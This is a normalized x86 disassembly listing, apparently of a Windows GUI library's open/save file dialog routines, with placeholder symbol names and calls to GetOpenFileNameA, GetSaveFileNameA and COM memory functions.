mov eax ebx
call sub_3a6e25c
mov ebx eax
test ebx ebx
jne r-xdata
sub_3a9f528
push ebp
mov ebp esp
add esp 0xffffff8c
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a9f8d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x74 ]
xor ecx ecx
mov edx 0x58
call sub_3a63a44
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
cmp [ ebx + 0x48 ] 0x0
jne r-xdata
mov [ ebp - 0x74 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x74 ] 0x58
jmp r-xdata
cmp [ ebx + 0xb2 ] 0x0
jne r-xdata
mov [ ebp - 0x54 ] 0x104
mov [ ebp - 0x54 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x68 ]
call sub_3a9f4d0
mov eax [ ebp - 0x4 ]
call sub_3a65730
mov [ ebp - 0x68 ] eax
mov eax [ ebx + 0x6c ]
mov [ ebp - 0x5c ] eax
mov [ ebx + 0x70 ] eax
test [ ebx + 0x64 ] 0x40
je r-xdata
cmp [ ebx + 0x52 ] 0x0
jne r-xdata
mov eax [ ebx + 0x74 ]
call sub_3a65730
mov [ ebp - 0x48 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x54 ]
add edx 0x2
lea eax [ ebp - 0x8 ]
call sub_3a659c0
mov eax [ ebp - 0x8 ]
call sub_3a65730
mov esi eax
mov [ ebp - 0x58 ] esi
mov edx [ ebp - 0x54 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_3a63a44
mov eax [ ebx + 0x80 ]
call sub_3a65730
mov edx eax
mov ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x58 ]
call sub_3a6a1ac
cmp [ ebx + 0x74 ] 0x0
jne r-xdata
cmp [ ebx + 0x5a ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x64 ] edx
mov eax r-xdata
mov [ ebp - 0x48 ] eax
jmp r-xdata
mov eax GetOpenFileNameA
cmp eax [ ebp - 0x10 ]
jne r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x40 ] edx
mov eax [ ebx + 0x78 ]
call sub_3a65730
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] 0x20
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov esi rw-data
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a9eb6c
mov [ ebp - 0x1c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a9eb6c
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_3a9f5f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
call sub_3a9edb8
neg al
sbb eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
call sub_3a64380
retn
and [ ebp - 0x40 ] 0xfff7ffff
xor [ ebp - 0x40 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test [ ebp - 0x3e ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x66 ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_3a65730
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x80 ]
call sub_3a6a01c
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x7c ]
call sub_3a65338
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x30 ] sub_3a9e524
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb8 ] edx
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov [ ebp - 0x30 ] sub_3a9f15c
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x20 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xd4 ] 0x0
je r-xdata
or [ ebp - 0x40 ] 0x40
mov [ ebp - 0x2c ] eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
call sub_3a9e438
mov [ ebp - 0x70 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ab29f0
mov esi eax
mov [ ebx + 0x40 ] esi
mov eax esi
mov [ eax + 0x250 ] ebx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x254 ] edx
mov eax [ ebx + 0x40 ]
call sub_3ab7c38
mov [ ebp - 0x70 ] eax
jmp r-xdata
mov [ ebp - 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9f8dd
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a652c4
retn
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_3a9fa50
test [ ebp - 0x3f ] 0x4
je r-xdata
lea ecx [ ebp - 0x74 ]
mov edx [ ebp - 0x10 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
and [ ebx + 0x64 ] 0xffffff7f
or [ ebx + 0x64 ] 0x80
jmp r-xdata
and [ ebx + 0x64 ] 0xfffffffe
or [ ebx + 0x64 ] 0x1
jmp r-xdata
test [ ebp - 0x40 ] 0x1
je r-xdata
mov eax [ ebp - 0x5c ]
mov [ ebx + 0x6c ] eax
sub_3a9f8ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x1 ]
mov eax esi
call sub_3a6e25c
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_3a65390
inc ebx
mov eax edi
mov edx esi
call sub_3a65498
mov eax esi
call sub_3a6a150
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3a9f934
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a9fa38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a9f8ec
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_3a9f8ec
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a69f28
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a6556c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9fa3f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_3a9f8ec
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
cmp eax 0x3
jg r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
setne al
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
setne al
mov al 0x1
jmp r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a655b8
test al al
je r-xdata
sub_3a9fa50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a9fb09
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x64 ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x64 ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x66 ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x80
call sub_3a9f8ec
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_3a9f934
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x84 ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x80
call sub_3a652f4
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9fb10
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
sub_3a9fb18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_3a78e1c
test [ ebx + 0x66 ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a9fb6c
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_3a652f4
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call __imp_SendMessageA
mov edx esi
mov eax esp
call sub_3a6a360
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_3a9fbd8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
cmp ebx 0x1
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ edi + 0x74 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_3a65798
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_3a6e018
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_3a6e060
test al al
jne r-xdata
dec ebx
sub_3a9fc2b
inc [ ecx ]
add [ eax ] al
add [ edx ] bh
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx GetOpenFileNameA
mov ecx esi
mov eax ebx
call sub_3a9f528
cmp eax 0x1
sbb eax eax
inc eax
pop esi
pop ebx
retn
sub_3a9fc70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx GetSaveFileNameA
mov ecx esi
mov eax ebx
call sub_3a9f528
cmp eax 0x1
sbb eax eax
inc eax
pop esi
pop ebx
retn
sub_3a9fc90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a7ae30
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
mov [ esi + 0x18 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9fcd0
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call CoTaskMemFree
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7ae68
test bl bl
jle r-xdata
push eax
call CoTaskMemFree
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a9fd10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_3a9fd84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push eax
call CoTaskMemFree
mov esi eax
mov eax esi
add eax eax
add eax 0x2
push eax
call CoTaskMemAlloc
mov edi eax
mov [ ebx + 0x10 ] edi
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
call sub_3a65bdc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax edi
call sub_3a99054
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9fd8b
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub eax 0x4
mov eax [ eax ]
sub_3a9fd94
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7aed4
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0xc ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3a9fdbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_3a9fe30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
push eax
call CoTaskMemFree
mov esi eax
mov eax esi
add eax eax
add eax 0x2
push eax
call CoTaskMemAlloc
mov edi eax
mov [ ebx + 0x18 ] edi
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_3a65bdc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax edi
call sub_3a99054
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9fe37
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub eax 0x4
mov eax [ eax ]
sub_3a9fe4c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
call sub_3a7b21c
push eax
mov eax ebp
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
mov eax esi
call sub_3a7b21c
mov edi eax
dec edi
test edi edi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
mov edx ebx
mov eax esi
call sub_3a9feb4
call sub_3a9fd10
mov edx [ ebp ]
mov [ edx + ebx * 8 ] eax
mov edx ebx
mov eax esi
call sub_3a9feb4
call sub_3a9fdbc
mov edx [ ebp ]
mov [ edx + ebx * 8 + 0x4 ] eax
inc ebx
dec edi
jne r-xdata
sub_3a9fec8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x4 ] 0xffffffff
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9ff34
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7aed4
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0xc ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3aa00b8
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
cmp [ esi + 0x7a ] 0x0
je r-xdata
mov eax 0x80004001
mov eax esi
mov si 0xffe5
call sub_3a6457c
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_3aa00e0
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
cmp [ esi + 0x82 ] 0x0
je r-xdata
mov eax 0x80004001
mov eax esi
mov si 0xffe4
call sub_3a6457c
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_3aa010c
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
cmp [ esi + 0x8a ] 0x0
je r-xdata
mov eax 0x80004001
mov edx [ ebp + 0x10 ]
mov eax esi
mov si 0xffe3
call sub_3a6457c
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_3aa013c
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
cmp [ esi + 0x92 ] 0x0
je r-xdata
mov eax 0x80004001
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax esi
mov si 0xffe2
call sub_3a6457c
jmp r-xdata
pop esi
pop ebp
retn 0x10
sub_3aa0170
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0xc ]
cmp [ esi + 0x9a ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
call sub_3aa0cac
mov [ ebx + 0x10 ] 0x0
mov eax 0x80004001
mov eax esi
mov si 0xffe1
call sub_3a6457c
jmp r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
sub_3aa01b0
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
cmp [ esi + 0xa2 ] 0x0
je r-xdata
mov eax 0x80004001
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax esi
mov si 0xffe0
call sub_3a6457c
jmp r-xdata
pop esi
pop ebp
retn 0x10
sub_3aa01e4
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov si 0xffdf
call sub_3a6457c
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0xc ]
call sub_3aa0cac
mov [ ebx + 0x10 ] 0x0
sub_3aa0210
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a83664
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] 0x1
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7b014
mov [ esi + 0x54 ] eax
xor eax eax
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x60 ] eax
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7b014
mov [ esi + 0x40 ] eax
lea eax [ esi + 0x64 ]
call sub_3a66cb4
lea eax [ esi + 0x68 ]
call sub_3a66cb4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aa02a8
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4c ]
call sub_3a64380
mov eax [ esi + 0x54 ]
call sub_3a64380
mov eax [ esi + 0x40 ]
call sub_3a64380
lea eax [ esi + 0x64 ]
call sub_3a66cb4
lea eax [ esi + 0x68 ]
call sub_3a66cb4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3aa030c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x7a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_3aa034c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_3aa03f8
push esi
push edi
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xd4 ] 0x0
je r-xdata
call sub_3a9e438
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3ad0b18
mov esi eax
test esi esi
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn
call sub_3a9e438
mov esi eax
jmp r-xdata
sub_3aa043c
push ebp
mov ebp esp
mov ecx 0x2c
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3aa08fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x6
jge r-xdata
mov [ ebp - 0x11 ] 0x0
lea edx [ ebp - 0x130 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp - 0x130 ]
mov eax [ ebp - 0xc ]
add eax 0x3c
call sub_3a66ccc
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
lea edx [ ebp - 0x12c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
call sub_3a64260
lea eax [ ebp - 0x12c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x4
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa0902
lea eax [ ebp - 0x160 ]
call sub_3a65a7c
lea eax [ ebp - 0x15c ]
mov edx [ r-xdata ]
call sub_3a665dc
lea eax [ ebp - 0x158 ]
mov edx 0x6
call sub_3a65a94
lea eax [ ebp - 0x130 ]
call sub_3a66cb4
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
xor ecx ecx
push ebp
push sub_3aa089f
push [ fs : ecx ]
mov [ fs : ecx ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x3c ]
call sub_3a66ccc
mov eax [ ebp - 0xc ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
lea edx [ ebp - 0x140 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
call sub_3a69100
lea eax [ ebp - 0x140 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x60 ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
lea eax [ ebp - 0x144 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x34 ]
call sub_3a65bdc
mov eax [ ebp - 0x144 ]
call sub_3a65bec
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x58 ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
lea eax [ ebp - 0x148 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x44 ]
call sub_3a65bdc
mov eax [ ebp - 0x148 ]
call sub_3a65bec
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
lea eax [ ebp - 0x14c ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x48 ]
call sub_3a65bdc
mov eax [ ebp - 0x14c ]
call sub_3a65bec
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x4c ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
lea eax [ ebp - 0x150 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x5c ]
call sub_3a65bdc
mov eax [ ebp - 0x150 ]
call sub_3a65bec
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
lea eax [ ebp - 0x154 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x6c ]
call sub_3a65bdc
mov eax [ ebp - 0x154 ]
call sub_3a65bec
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x54 ]
call sub_3a7b21c
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
push eax
lea edx [ ebp - 0x140 ]
mov eax r-xdata
call sub_3a69100
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x158 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x38 ]
call sub_3a65bdc
mov eax [ ebp - 0x158 ]
call sub_3a65bec
xor edx edx
pop ecx
call sub_3a91d88
test eax 0x80000000
sete al
test al al
je r-xdata
xor esi esi
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x60 ]
xor eax eax
mov edi rw-data
lea edx [ ebp - 0x15c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x54 ]
call sub_3a9fe4c
mov eax [ ebp - 0x15c ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x54 ]
call sub_3a7b21c
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x50 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
jae r-xdata
and ecx 0x7f
bt edx ecx
inc eax
add edi 0x4
cmp al 0x15
jne r-xdata
or esi [ edi ]
mov ecx eax
cmp cl 0x1f
ja r-xdata
push esi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
call sub_3a9ff5c
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_3aa079f
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x24 ]
call sub_3a9ff18
test al al
jne r-xdata
mov eax [ ebp - 0x24 ]
call sub_3a9ff0c
mov edi eax
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
push eax
lea edx [ ebp - 0x140 ]
mov eax r-xdata
call sub_3a69100
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x160 ]
mov edx [ edi + 0xc ]
call sub_3a65bdc
mov eax [ ebp - 0x160 ]
call sub_3a65bec
xor edx edx
pop ecx
call sub_3a91d88
mov esi eax
test esi 0x80000000
sete bl
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa07a6
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x54 ]
retn
mov dl 0x1
mov eax [ ebp - 0x24 ]
